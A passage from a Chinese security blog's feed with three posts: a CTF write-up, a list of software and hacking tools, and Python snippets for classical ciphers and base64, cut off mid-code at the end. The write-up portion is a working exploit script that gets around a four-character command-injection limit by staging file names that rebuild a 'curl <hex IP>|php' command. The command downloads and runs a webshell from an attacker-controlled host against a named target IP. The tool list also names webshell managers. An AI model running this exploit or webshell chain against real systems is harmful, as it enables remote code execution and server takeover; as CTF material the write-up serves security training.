class="comment">#-*-coding:utf8-*-</span></div><div class="line"><span class="comment"># by https://findneo.github.io/</span></div><div class="line"><span class="keyword">import</span> requests <span class="keyword">as</span> r</div><div class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</div><div class="line"><span class="keyword">import</span> random</div><div class="line"><span class="keyword">import</span> hashlib</div><div class="line">target = <span class="string">'http://52.197.41.31/'</span></div><div class="line"></div><div class="line"><span class="comment"># 存放待下载文件的公网主机的IP</span></div><div class="line">shell_ip = <span class="string">'xx.xx.xx.xx'</span></div><div class="line"></div><div class="line"><span class="comment"># 本机IP</span></div><div class="line">your_ip = r.get(<span class="string">'http://ipv4.icanhazip.com/'</span>).text.strip()</div><div class="line"></div><div class="line"><span class="comment"># 将shell_IP转换成十六进制</span></div><div class="line">ip = <span class="string">'0x'</span> + <span class="string">''</span>.join([str(hex(int(i))[<span class="number">2</span>:].zfill(<span class="number">2</span>))</div><div class="line">                     <span class="keyword">for</span> i <span class="keyword">in</span> shell_ip.split(<span class="string">'.'</span>)])</div><div class="line"></div><div class="line">reset = target + <span class="string">'?reset'</span></div><div class="line">cmd = target + <span class="string">'?cmd='</span></div><div class="line">sandbox = target + <span class="string">'sandbox/'</span> + \</div><div class="line">    hashlib.md5(<span class="string">'orange'</span> + your_ip).hexdigest() + <span class="string">'/'</span></div><div class="line"></div><div class="line"><span class="comment"># payload某些位置的可选字符</span></div><div class="line">pos0 = random.choice(<span class="string">'efgh'</span>)</div><div class="line">pos1 = random.choice(<span class="string">'hkpq'</span>)</div><div class="line">pos2 = <span class="string">'g'</span>  <span class="comment"># 随意选择字符</span></div><div class="line"></div><div class="line">payload = [</div><div class="line">    <span class="string">'&gt;dir'</span>,</div><div class="line">    <span class="comment"># 创建名为 dir 的文件</span></div><div class="line"></div><div class="line">    <span class="string">'&gt;%s\&gt;'</span> % pos0,</div><div class="line">    <span class="comment"># 假设pos0选择 f , 创建名为 f&gt; 的文件</span></div><div class="line"></div><div class="line">    <span class="string">'&gt;%st-'</span> % pos1,</div><div class="line">    <span class="comment"># 假设pos1选择 k , 创建名为 kt- 的文件,必须加个pos1，</span></div><div class="line">    <span class="comment"># 因为alphabetical序中t&gt;s</span></div><div class="line"></div><div class="line">    <span class="string">'&gt;sl'</span>,</div><div class="line">    <span class="comment"># 创建名为 &gt;sl 的文件；到此处有四个文件，</span></div><div class="line">    <span class="comment"># ls 的结果会是：dir f&gt; kt- sl</span></div><div class="line"></div><div class="line">    <span class="string">'*&gt;v'</span>,</div><div class="line">    <span class="comment"># * 相当于 `ls` ，那么这条命令等价于 `dir f&gt; kt- sl`&gt;v ，</span></div><div class="line">    <span class="comment">#  dir是不换行的，所以这时会创建文件 v 并写入 f&gt; kt- sl</span></div><div class="line">    <span class="comment"># 非常奇妙，这里的文件名是 v ，只能是v ，没有可选字符</span></div><div class="line"></div><div class="line">    <span class="string">'&gt;rev'</span>,</div><div class="line">    <span class="comment"># 创建名为 rev 的文件，这时当前目录下 ls 的结果是： dir f&gt; kt- rev sl v</span></div><div class="line"></div><div class="line">    <span class="string">'*v&gt;%s'</span> % pos2,</div><div class="line">    <span class="comment"># 魔法发生在这里： *v 相当于 rev v ，* 看作通配符。体会一下。</span></div><div class="line">    <span class="comment"># 这时pos2文件，也就是 g 文件内容是文件v内容的反转： ls -tk &gt; f</span></div><div class="line"></div><div class="line">    <span class="comment"># 续行分割 curl 0x11223344|php 并逆序写入</span></div><div class="line">    <span class="string">'&gt;p'</span>,</div><div class="line">    <span class="string">'&gt;ph\\'</span>,</div><div class="line">    <span class="string">'&gt;\|\\'</span>,</div><div class="line">    <span class="string">'&gt;%s\\'</span> % ip[<span class="number">8</span>:<span class="number">10</span>],</div><div class="line">    <span class="string">'&gt;%s\\'</span> % ip[<span class="number">6</span>:<span class="number">8</span>],</div><div class="line">    <span class="string">'&gt;%s\\'</span> % ip[<span class="number">4</span>:<span class="number">6</span>],</div><div class="line">    <span class="string">'&gt;%s\\'</span> % ip[<span class="number">2</span>:<span class="number">4</span>],</div><div class="line">    <span class="string">'&gt;%s\\'</span> % ip[<span class="number">0</span>:<span class="number">2</span>],</div><div class="line">    <span class="string">'&gt;\ \\'</span>,</div><div class="line">    <span class="string">'&gt;rl\\'</span>,</div><div class="line">    <span class="string">'&gt;cu\\'</span>,</div><div class="line"></div><div class="line">    <span class="string">'sh '</span> + pos2,</div><div class="line">    <span class="comment"># sh g ;g 的内容是 ls -tk &gt; f ，那么就会把逆序的命令反转回来，</span></div><div class="line">    <span class="comment"># 虽然 f 的文件头部会有杂质，但不影响有效命令的执行</span></div><div class="line">    <span class="string">'sh '</span> + pos0,</div><div class="line">    <span class="comment"># sh f 执行curl命令，下载文件，写入木马。</span></div><div class="line">]</div><div class="line"></div><div class="line">s = r.get(reset)</div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> payload:</div><div class="line">    <span class="keyword">assert</span> len(i) &lt;= <span class="number">4</span></div><div class="line">    s = r.get(cmd + i)</div><div class="line">    <span class="keyword">print</span> <span class="string">'[%d]'</span> % s.status_code, s.url</div><div class="line">    sleep(<span class="number">0.1</span>)</div><div class="line">s = r.get(sandbox + <span class="string">'fun.php?cmd=uname -a'</span>)</div><div class="line"><span class="keyword">print</span> <span class="string">'[%d]'</span> % s.status_code, s.url</div><div class="line"><span class="keyword">print</span> s.text</div></pre></td></tr></table></figure><h4 id="更多解答-1"><a href="#更多解答-1" class="headerlink" title="更多解答"></a>更多解答</h4><p><a href="https://github.com/orangetw/My-CTF-Web-Challenges#babyfirst-revenge-v2" target="_blank" rel="external">https://github.com/orangetw/My-CTF-Web-Challenges#babyfirst-revenge-v2</a></p><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a href="https://speakerdeck.com/player/f81159300925466c88335f3cf740beb6" target="_blank" rel="external">来自小密圈里的那些奇技淫巧</a> </p>]]></content>
    
    <summary type="html">
    
      绕过四个字符限制getshell
    
    </summary>
    
      <category term="writeup" scheme="https://findneo.github.io/categories/writeup/"/>
    
    
      <category term="ctf" scheme="https://findneo.github.io/tags/ctf/"/>
    
      <category term="命令注入" scheme="https://findneo.github.io/tags/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>computer tools</title>
    <link href="https://findneo.github.io/2017/11/computer-tools/"/>
    <id>https://findneo.github.io/2017/11/computer-tools/</id>
    <published>2017-11-03T04:50:51.000Z</published>
    <updated>2017-11-22T10:36:00.102Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p><a href="https://github.com/findneo/computerTools" target="_blank" rel="external">https://github.com/findneo/computerTools</a></p></blockquote><h3 id="系统优化类"><a href="#系统优化类" class="headerlink" title="系统优化类"></a>系统优化类</h3><p><a href="http://www.voidtools.com/" target="_blank" rel="external">everything</a> 本地文件全盘搜索。</p><p><a href="https://www.mythicsoft.com/agentransack/download" target="_blank" rel="external">agentransack</a> 本地文档全文搜索。</p><p><a href="https://www.mythicsoft.com/filelocatorpro/download" target="_blank" rel="external">filelocator</a>  付费版本地文档全文搜索。</p><p><a href="https://notepad-plus-plus.org/" target="_blank" rel="external">notepad++</a> 轻量却强大的文本编辑器，支持插件扩展和很多自定义项。</p><p>​    插件推荐：</p><ul><li>markdownviewer++ 预览md文件</li><li>php autocompletion</li><li>emmet</li></ul><p>Resilio Sync 就像，不限容，不限速，无审查的云盘 。 </p><p>teleport ultra 全站克隆到本地 。</p><p><a href="https://iobit-uninstaller.en.softonic.com/" target="_blank" rel="external">iobitUninstaller</a>  程序彻底卸载。</p><p><a href="http://down.sandai.net/thunderspeed/ThunderSpeed1.0.34.360.exe" target="_blank" rel="external">迅雷极速版7.10.34.360</a>      存粹的下载器。</p><p><a href="https://github.com/shadowsocks" target="_blank" rel="external">shadowsocks</a>    代理工具，更方便地访问互联网。</p><p><a href="http://www.splayer.org/" target="_blank" rel="external">splayer</a>  本地视音频播放器，无广告，可自动搜索影片字幕。已停更。</p><p><a href="http://potplayer.daum.net/?lang=zh_CN" target="_blank" rel="external">potplayer</a> 强大的影音播放器。</p><p> <del><a href="https://justgetflux.com/" target="_blank" rel="external">f.lux</a></del>  自动调节电脑屏幕色温，保护视力。win10创意者更新中已集成到系统 。</p><p><a href="http://www.443w.com/hu/" target="_blank" rel="external">护眼啦</a> 定时提醒休息。高于1.6的某些版本会报毒。可自行<a href="https://www.google.com/search?q=%E6%8A%A4%E7%9C%BC%E5%95%A6+1.6" target="_blank" rel="external">谷歌</a> 或 <a href="https://www.baidu.com/s?wd=%E6%8A%A4%E7%9C%BC%E5%95%A6%2B1.6" target="_blank" rel="external">百度</a> 下载低版本。</p><p><a href="http://forum.ubuntu.org.cn/viewtopic.php?f=137&amp;t=392969" target="_blank" rel="external">eyerest</a>  ubuntu下的护眼工具。</p><p>foxmail邮箱客户端，RSS功能也不错。</p><p><a href="http://dir.jjol.cn/Pyjj/index.aspx" target="_blank" rel="external">加加输入法</a> 文明和谐的输入法。</p><p><a href="http://www.7-zip.org/" target="_blank" rel="external">7zip</a> 开源免费无广告的压缩工具。</p><p>win10锁屏壁纸所在文件夹<code>(C:\Users\\++username++\AppData\Local\Packages\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\LocalState\Assets)</code></p><p>谷歌浏览器 <a href="http://www.google.cn/chrome/browser/desktop/index.html" target="_blank" rel="external">中文版</a>,<a href="https://www.google.com/chrome/browser/desktop/index.html?hl=en" target="_blank" rel="external">英文版</a> </p><p>插件推荐：</p><ul><li><a href="https://chrome.google.com/webstore/detail/octotree/bkhaagjahfmjljalopjnoealnfndnagc" target="_blank" rel="external">octotree</a>   github目录树查看。</li><li><a href="https://chrome.google.com/webstore/search/adblock" target="_blank" rel="external">adblock</a>   拦截广告</li><li>印象笔记</li><li>cookiesmanager </li><li>shodan</li><li><a href="https://github.com/listen1/listen1_chrome_extension" target="_blank" rel="external">listen1</a>集成多平台歌源，下载压缩包并解压后以chrome开发者模式加载</li><li><a href="http://tampermonkey.net/index.php?version=4.2.7&amp;ext=dhdg&amp;show=dhdg" target="_blank" rel="external">tamperMonkey</a><ul><li><a href="https://greasyfork.org/zh-CN/scripts/12758-youdaodict" target="_blank" rel="external">有道取词1.4</a>  </li><li><a href="https://greasyfork.org/zh-CN/scripts/" target="_blank" rel="external">更多脚本</a></li></ul></li></ul><p>火狐浏览器</p><p>插件推荐：</p><ul><li>印象笔记  </li><li><a href="https://addons.mozilla.org/zh-CN/firefox/addon/greasemonkey/?src=search" target="_blank" rel="external">GreasyMonkey</a>   <ul><li><a href="https://greasyfork.org/zh-CN/scripts/12758-youdaodict" target="_blank" rel="external">有道取词1.4</a>  </li><li><a href="https://greasyfork.org/zh-CN/scripts/" target="_blank" rel="external">更多脚本</a>  </li></ul></li><li>Hack Bar  </li><li>firebug  </li><li>uBlock Origin  </li><li>Bookmark Dedulplicator  </li><li>add to wunderlist  </li><li>Tamper Data拦截修改  </li><li>Modify Headers修改头部  </li><li>AutoProxy  </li><li>NoScript  </li><li>Live Http Header</li></ul><p>markdown相关:</p><ul><li><a href="https://maxiang.io/" target="_blank" rel="external">马克飞象</a> </li><li><a href="http://markdownpad.com/" target="_blank" rel="external">markdownPad2</a> 右侧即时预览的markdown编辑器</li><li><a href="https://typora.io/" target="_blank" rel="external">typora</a> 所见即所得的markdown编辑器</li></ul><p>文件同步：</p><ul><li><a href="https://allwaysync.com/" target="_blank" rel="external">allwaysync</a> </li><li><a href="https://www.jianguoyun.com/" target="_blank" rel="external">坚果云</a> </li></ul><p><a href="http://www.dopdf.com/quick-download.php" target="_blank" rel="external">dopdf</a>  其他格式文件转pdf，效果不错。</p><p>telegram 即时通讯工具，被墙。</p><p> <a href="http://xianshuhua2.blog.163.com/blog/static/99760751201362854753660/" target="_blank" rel="external">WPS Office 2013 个人版</a>  </p><h3 id="学习相关类"><a href="#学习相关类" class="headerlink" title="学习相关类"></a>学习相关类</h3><p><a href="https://www.yinxiang.com/" target="_blank" rel="external">印象笔记</a> </p><p><a href="https://www.sumatrapdfreader.org/free-pdf-reader.html" target="_blank" rel="external">sumatraPdf</a>  小巧好用的PDF阅读器，已停更。</p><p><a href="https://www.foxitsoftware.cn/downloads/" target="_blank" rel="external">福昕(xin)pdf阅读器</a> </p><p><a href="https://sourceforge.net/projects/freemind/" target="_blank" rel="external">freemind</a>  开源的思维导图工具。</p><p><a href="http://goldendict.org/" target="_blank" rel="external">goldenDict</a> 离线词典。</p><p><a href="http://todotxt.org/" target="_blank" rel="external">todotxt</a>，纯文本GTD工具。</p><p>calibre 书籍管理，azw阅读器很棒 。</p><p> <a href="http://www.wjjsoft.com/index_chs.html" target="_blank" rel="external">myBase</a> 知识管理。</p><p><a href="https://zealdocs.org/" target="_blank" rel="external">zeal</a> 离线文档查询。</p><p>Cisco Packet Tracer Student，路由模拟器。</p><p>GNS3 数据通信模拟器。</p><h3 id="开发相关类"><a href="#开发相关类" class="headerlink" title="开发相关类"></a>开发相关类</h3><p>visual studio code </p><p><a href="http://www.sublimetext.com/" target="_blank" rel="external">sublimeText</a> 功能齐全，好看。</p><ul><li>插件HTML-CSS-JS Prettify </li><li>jedi ：python自动补全</li><li>anaconda </li><li>Localization汉化 </li><li>ConvertToUTF8解决编码问题 </li><li>Bracket Highlighter匹配括号，引号和html标签。 </li><li>DocBlockr　自动生成PHPDoc风格的注释。支持的js, PHP, ActionScript, CoffeeScript, Java, Objective C, C, C++ </li><li>Emmet(Zen Coding)　快速生成HTML代码段的插件,很强大。比如试试html:4s </li><li>其它相关 <a href="https://github.com/jikeytang/sublime-text" target="_blank" rel="external">https://github.com/jikeytang/sublime-text</a> </li></ul><p>devcpp </p><p>wing IDE python 集成开发环境</p><p>git 版本管理</p><p>远程管理</p><ul><li><a href="https://mobaxterm.mobatek.net/" target="_blank" rel="external">MobaXterm</a> 强大，方便，好看。</li><li>winscp</li><li>real VNC</li><li>xshell </li><li>secureCRT</li><li><a href="https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html" target="_blank" rel="external">putty</a> </li><li>teamviewer</li><li><a href="https://github.com/epinna/weevely3" target="_blank" rel="external">weevely</a></li><li>中国菜刀</li></ul><p>本地环境搭建</p><ul><li>wamp </li><li>phpstudy </li></ul><p>source insight </p><p>matlab </p><p>jre/jdk </p><p>python/anaconda </p><p>wsl </p><p>linux </p><ul><li>fish shell </li><li>zsh shell </li></ul><h3 id="安全类"><a href="#安全类" class="headerlink" title="安全类"></a>安全类</h3><p>winhex </p><p>010editor</p><p>zip压缩文件爆破</p><ul><li>advanced zip password recovery </li><li>ziperello </li></ul><p>御剑 </p><p>awvs</p><p>nmap</p><p>sqlmap </p><p>burpsuite </p><p>wireshark </p><p>fiddler</p><p>OD </p><p>IDAPRO </p><p>OWASP Mantra Janus</p><p>MoC en 0.3 Alpha</p><p>seay代码审计系统</p><p>virtual box开源的虚拟机软件，内存占用较小</p><p>vmware </p><ul><li>kali </li><li>backtrack </li><li>52pojie虚拟机 </li><li>xampp+dvwa </li><li>Metasploitable-linux </li><li>OWASP_Broken_Web_Apps_VM </li><li>SEEDUbuntu </li><li>web for pentester </li><li>WebGoat-OWASP_standard_win32 </li></ul><h3 id="小工具"><a href="#小工具" class="headerlink" title="小工具"></a>小工具</h3><ul><li><a href="https://technet.microsoft.com/en-us/sysinternals/bb897441.aspx" target="_blank" rel="external">微软的签名检查命令行工具sigcheck</a> </li><li><a href="https://support.microsoft.com/zh-cn/help/841290/availability-and-description-of-the-file-checksum-integrity-verifier-utility" target="_blank" rel="external">微软的命令行校验工具fciv</a> </li><li>HXD十六进制编辑器 </li><li>截图工具<a href="https://zh.snipaste.com/download.html" target="_blank" rel="external">snipaste</a> </li><li>硬件信息检测<a href="http://dl.pconline.com.cn/html_2/1/60/id=786&amp;pn=0.html" target="_blank" rel="external">CPU-Z</a></li></ul><h3 id="好的在线工具"><a href="#好的在线工具" class="headerlink" title="好的在线工具"></a>好的在线工具</h3><ul><li><a href="https://hackmd.io/" target="_blank" rel="external">markdown协作</a></li><li><a href="http://notepad.live" target="_blank" rel="external">文本共享</a></li></ul>]]></content>
    
    <summary type="html">
    
      记录一些好用的工具
    
    </summary>
    
      <category term="备忘" scheme="https://findneo.github.io/categories/%E5%A4%87%E5%BF%98/"/>
    
    
      <category term="hacklife" scheme="https://findneo.github.io/tags/hacklife/"/>
    
  </entry>
  
  <entry>
    <title>python代码段</title>
    <link href="https://findneo.github.io/2017/10/python-snippets/"/>
    <id>https://findneo.github.io/2017/10/python-snippets/</id>
    <published>2017-10-15T08:45:21.000Z</published>
    <updated>2017-11-25T15:21:15.699Z</updated>
    
    <content type="html"><![CDATA[<h3 id="栅栏密码加解密"><a href="#栅栏密码加解密" class="headerlink" title="栅栏密码加解密"></a>栅栏密码加解密</h3><h4 id="单行版本"><a href="#单行版本" class="headerlink" title="单行版本"></a>单行版本</h4><figure class="highlight python"><table><tr><td class="code"><pre><div class="line">railFence = <span class="keyword">lambda</span> s: [[i, <span class="string">''</span>.join([s[k * i + j] <span class="keyword">for</span> j <span class="keyword">in</span> range(i) <span class="keyword">for</span> k <span class="keyword">in</span> range(len(s) / i)])] <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, len(s)) <span class="keyword">if</span> <span class="keyword">not</span> len(s) % i]</div><div class="line"><span class="keyword">print</span> railFence(<span class="string">'hello world , 2017 ! '</span>)</div></pre></td></tr></table></figure><h4 id="正常版本"><a href="#正常版本" class="headerlink" title="正常版本"></a>正常版本</h4><figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">railFence</span><span class="params">(s)</span>:</span></div><div class="line">    ll = len(s)</div><div class="line">    res = dict()</div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, ll):</div><div class="line">        r = <span class="string">''</span></div><div class="line">        <span class="keyword">if</span> ll % i == <span class="number">0</span>:</div><div class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> range(i):</div><div class="line">                <span class="keyword">for</span> k <span class="keyword">in</span> range(ll / i):</div><div class="line">                    r += s[k * i + j]</div><div class="line">            res[i] = r</div><div class="line">    <span class="keyword">return</span> res</div><div class="line"></div><div class="line"><span class="comment"># test</span></div><div class="line"><span class="keyword">print</span> railFence(<span class="string">'hello world , 2017 ! '</span>)</div><div class="line"><span class="comment"># &#123;1: 'hello world , 2017 ! ', 3: 'hlwl,0 eood 1!l r 27 ', 7: 'ho2er0ll1ld7o   ,!w  '&#125;</span></div></pre></td></tr></table></figure><h3 id="凯撒密码加解密"><a href="#凯撒密码加解密" class="headerlink" title="凯撒密码加解密"></a>凯撒密码加解密</h3><h4 id="单行版本-1"><a href="#单行版本-1" class="headerlink" title="单行版本"></a>单行版本</h4><figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">caesar</span><span class="params">(s)</span>:</span> <span class="keyword">return</span> [[off, <span class="string">''</span>.join([chr((ord(i) - <span class="number">97</span> + off) % <span class="number">26</span> + <span class="number">97</span>) <span class="keyword">if</span> <span class="string">'a'</span> &lt;= i &lt;= <span class="string">'z'</span> <span class="keyword">else</span> chr((ord(i) - <span class="number">65</span> + off) % <span class="number">26</span> + <span class="number">65</span>) <span class="keyword">if</span> <span class="string">'A'</span> &lt;= i &lt;= <span class="string">'Z'</span> <span class="keyword">else</span> i <span class="keyword">for</span> i <span class="keyword">in</span> str(s)])] <span class="keyword">for</span> off <span class="keyword">in</span> range(<span class="number">26</span>)]</div><div class="line"><span class="keyword">print</span> caesar(<span class="string">'h3llo'</span>)</div></pre></td></tr></table></figure><h4 id="正常版本-1"><a href="#正常版本-1" class="headerlink" title="正常版本"></a>正常版本</h4><figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">caesar</span><span class="params">(s)</span>:</span></div><div class="line">    cycle = <span class="number">26</span></div><div class="line">    res = []</div><div class="line">    <span class="keyword">for</span> offset <span class="keyword">in</span> range(<span class="number">26</span>):</div><div class="line">        r = <span class="string">''</span></div><div class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> str(s):</div><div class="line">            <span class="keyword">if</span> <span class="string">'a'</span> &lt;= i &lt;= <span class="string">'z'</span>:</div><div class="line">                r += chr((ord(i) - ord(<span class="string">'a'</span>) + offset) % cycle + ord(<span class="string">'a'</span>))</div><div class="line">            <span class="keyword">elif</span> <span class="string">'A'</span> &lt;= i &lt;= <span class="string">'Z'</span>:</div><div class="line">                r += chr((ord(i) - ord(<span class="string">'A'</span>) + offset) % cycle + ord(<span class="string">'A'</span>))</div><div class="line">            <span class="keyword">else</span>:</div><div class="line">                r += i</div><div class="line">        res.append([offset, r])</div><div class="line">    <span class="keyword">return</span> res</div><div class="line"></div><div class="line"><span class="comment"># test</span></div><div class="line"><span class="keyword">print</span> caesar(<span class="string">'h3llo'</span>)</div><div class="line"><span class="comment">#[  [0, 'h3llo'], [1, 'i3mmp'], [2, 'j3nnq'], [3, 'k3oor'], [4, 'l3pps'], [5, 'm3qqt'], [6, 'n3rru'], [7, 'o3ssv'],</span></div><div class="line"><span class="comment">#   [8, 'p3ttw'], [9, 'q3uux'], [10, 'r3vvy'], [11, 's3wwz'], [12, 't3xxa'], [13, 'u3yyb'], [14, 'v3zzc'],</span></div><div class="line"><span class="comment">#   [15, 'w3aad'], [16, 'x3bbe'], [17, 'y3ccf'], [18, 'z3ddg'], [19, 'a3eeh'], [20, 'b3ffi'], [21, 'c3ggj'],</span></div><div class="line"><span class="comment">#   [22, 'd3hhk'], [23, 'e3iil'], [24, 'f3jjm'], [25, 'g3kkn']]</span></div></pre></td></tr></table></figure><h3 id="莫尔斯电码加解密"><a href="#莫尔斯电码加解密" class="headerlink" title="莫尔斯电码加解密"></a>莫尔斯电码加解密</h3><figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="comment"># by https://findneo.github.io/</span></div><div class="line"><span class="keyword">import</span> re</div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">morse</span><span class="params">(s)</span>:</span></div><div class="line">    morseChart = [<span class="string">'.-'</span>,       <span class="string">'-...'</span>,     <span class="string">'-.-.'</span>,     <span class="string">'-..'</span>,      <span class="string">'.'</span>,        <span class="string">'..-.'</span>,     <span class="string">'--.'</span>,</div><div class="line">                  <span class="string">'....'</span>,     <span class="string">'..'</span>,       <span class="string">'.---'</span>,     <span class="string">'-.-'</span>,      <span class="string">'.-..'</span>,     <span class="string">'--'</span>,       <span class="string">'-.'</span>,</div><div class="line">                  <span class="string">'---'</span>,      <span class="string">'.--.'</span>,     <span class="string">'--.-'</span>,     <span class="string">'.-.'</span>,      <span class="string">'...'</span>,      <span class="string">'-'</span>,        <span class="string">'..-'</span>,</div><div class="line">                  <span class="string">'...-'</span>,     <span class="string">'.--'</span>,      <span class="string">'-..-'</span>,     <span class="string">'-.--'</span>,     <span class="string">'--..'</span>,     <span class="string">'-----'</span>,    <span class="string">'.----'</span>,</div><div class="line">                  <span class="string">'..---'</span>,    <span class="string">'...--'</span>,    <span class="string">'....-'</span>,    <span class="string">'.....'</span>,    <span class="string">'-....'</span>,    <span class="string">'--...'</span>,    <span class="string">'---..'</span>,</div><div class="line">                  <span class="string">'----.'</span>,    <span class="string">'.-.-.-'</span>,   <span class="string">'--..--'</span>,   <span class="string">'..--..'</span>,   <span class="string">'-....-'</span>,   <span class="string">'.----.'</span>,   <span class="string">'---...'</span>,</div><div class="line">                  <span class="string">'.-..-.'</span>,   <span class="string">'-..-.'</span>,    <span class="string">'.--.-.'</span>,   <span class="string">'-.-.-.'</span>,   <span class="string">'-...-'</span>,    <span class="string">'-.-.--'</span>,   <span class="string">'..--.-'</span>,</div><div class="line">                  <span class="string">'-.--.'</span>,    <span class="string">'-.--.-'</span>,   <span class="string">'...-..-'</span>,  <span class="string">'.-...'</span>,    <span class="string">'.-.-.'</span>,    <span class="string">' '</span>,        <span class="string">'*'</span></div><div class="line">                  ]</div><div class="line">    alphaChart = [<span class="string">'a'</span>,        <span class="string">'b'</span>,        <span class="string">'c'</span>,        <span class="string">'d'</span>,        <span class="string">'e'</span>,        <span class="string">'f'</span>,        <span class="string">'g'</span>,</div><div class="line">                  <span class="string">'h'</span>,        <span class="string">'i'</span>,        <span class="string">'j'</span>,        <span class="string">'k'</span>,        <span class="string">'l'</span>,        <span class="string">'m'</span>,        <span class="string">'n'</span>,</div><div class="line">                  <span class="string">'o'</span>,        <span class="string">'p'</span>,        <span class="string">'q'</span>,        <span class="string">'r'</span>,        <span class="string">'s'</span>,        <span class="string">'t'</span>,        <span class="string">'u'</span>,</div><div class="line">                  <span class="string">'v'</span>,        <span class="string">'w'</span>,        <span class="string">'x'</span>,        <span class="string">'y'</span>,        <span class="string">'z'</span>,        <span class="string">'0'</span>,        <span class="string">'1'</span>,</div><div class="line">                  <span class="string">'2'</span>,        <span class="string">'3'</span>,        <span class="string">'4'</span>,        <span class="string">'5'</span>,        <span class="string">'6'</span>,        <span class="string">'7'</span>,        <span class="string">'8'</span>,</div><div class="line">                  <span class="string">'9'</span>,        <span class="string">'.'</span>,        <span class="string">','</span>,        <span class="string">'?'</span>,        <span class="string">'-'</span>,        <span class="string">"'"</span>,        <span class="string">':'</span>,</div><div class="line">                  <span class="string">'"'</span>,        <span class="string">'/'</span>,        <span class="string">'@'</span>,        <span class="string">';'</span>,        <span class="string">'='</span>,        <span class="string">'!'</span>,        <span class="string">'_'</span>,</div><div class="line">                  <span class="string">'('</span>,        <span class="string">')'</span>,        <span class="string">'$'</span>,        <span class="string">'&amp;'</span>,        <span class="string">'+'</span>,        <span class="string">' '</span>,        <span class="string">'#'</span></div><div class="line">                  ]</div><div class="line"></div><div class="line">    <span class="comment"># or as a dict -&gt;  &#123;c[1][i]: c[0][i] for i in xrange(len(c[0]))&#125;</span></div><div class="line">    c = [morseChart, alphaChart]</div><div class="line"></div><div class="line">    s = s.lower()</div><div class="line"></div><div class="line">    <span class="comment"># replace characters not in alphaChart with '#' ,which shall be '*' in</span></div><div class="line">    <span class="comment"># encoded string</span></div><div class="line">    s = re.sub(<span class="string">'[^a-z0-9.,?\-\':"/@;=!_()$&amp;+ ]'</span>, <span class="string">'#'</span>, s)</div><div class="line"></div><div class="line">    <span class="comment"># for convenience sake, I choose not to deal with space in morse.</span></div><div class="line">    s = re.sub(<span class="string">'\s+'</span>, <span class="string">' '</span>, s)</div><div class="line"></div><div class="line">    m = <span class="number">1</span>  <span class="comment"># default to decode</span></div><div class="line">    <span class="comment"># if mot mismatch that condition,we are to encode.</span></div><div class="line">    <span class="keyword">if</span> <span class="keyword">not</span> re.match(<span class="string">'[^-._ ]'</span>, s):</div><div class="line">        <span class="comment"># occasionally we meet [ ._]+ instead of [ .-]+</span></div><div class="line">        s = s.replace(<span class="string">'_'</span>, <span class="string">'-'</span>)</div><div class="line">        s = re.split(<span class="string">' '</span>, s)</div><div class="line">        m = <span class="number">0</span>  <span class="comment"># we are  to encode by morse</span></div><div class="line"></div><div class="line">    r = []</div><div class="line">    <span class="comment"># list().extend(foo) returns None so we use 'or r'</span></div><div class="line">    <span class="keyword">return</span> (m * <span class="string">' '</span>).join(r.extend([c[<span class="number">1</span> - m][c[m].index(i)] <span class="keyword">for</span> i <span class="keyword">in</span> s]) <span class="keyword">or</span> r)</div><div class="line"></div><div class="line"><span class="comment"># test</span></div><div class="line"><span class="keyword">print</span> morse(<span class="string">'Hello word,2017!'</span>)</div><div class="line"><span class="keyword">print</span> morse(<span class="string">'.... . .-.. .-.. ---   .-- --- .-. -.. --..-- ..--- ----- .---- --... -.-.--'</span>)</div></pre></td></tr></table></figure><h3 id="base64混合编码"><a href="#base64混合编码" class="headerlink" title="base64混合编码"></a>base64混合编码</h3><figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> *</div><div class="line"><span class="keyword">import</span> random</div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">baseRandomEncode</span><span class="params">(s, depth=<span class="number">3</span>)</span>:</span></div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(depth):</div><div class="line">        s = random.choice([b64encode, b32encode, b16encode])(s)</div><div class="line">    <span class="keyword">return</span> s</div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">print</span> baseRandomEncode(<span class="string">'hello world!'</span>)  <span class="comment"># test</span></div></pre></td></tr></table></figure><h3 id="base64混合解码"><a href="#base64混合解码" class="headerlink" title="base64混合解码"></a>base64混合解码</h3><figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="comment"># by https://findneo.github.io/</span></div><div class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> *</div><div class="line"><span class="keyword">import</span> re</div><div class="line"></div><div class="line"></div><div class="line">res = []</div><div class="line"><span class="comment"># repattern is a self-defining item.</span></div><div class="line"><span class="comment"># In CTF games,flag often comes as a printable string containing  '&#123;' and '&#125;'.</span></div><div class="line">repattern = <span class="string">"[ -~]*&#123;[ -~]*&#125;[ -~]*|[ -~]*&#125;[ -~]*&#123;[ -~]*"</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">basefuzzDecode</span><span class="params">(s)</span>:</span></div><div class="line">    <span class="keyword">global</span> res</div><div class="line">    <span class="keyword">for</span> f <span class="keyword">in</span> [b64decode, b32decode, b16decode]:</div><div class="line">        <span class="keyword">try</span>:</div><div class="line">            t = f(s)</div><div class="line">            <span class="keyword">if</span> re.match(repattern, t):</div><div class="line">                res.append(t)</div><div class="line">                <span class="keyword">return</span> 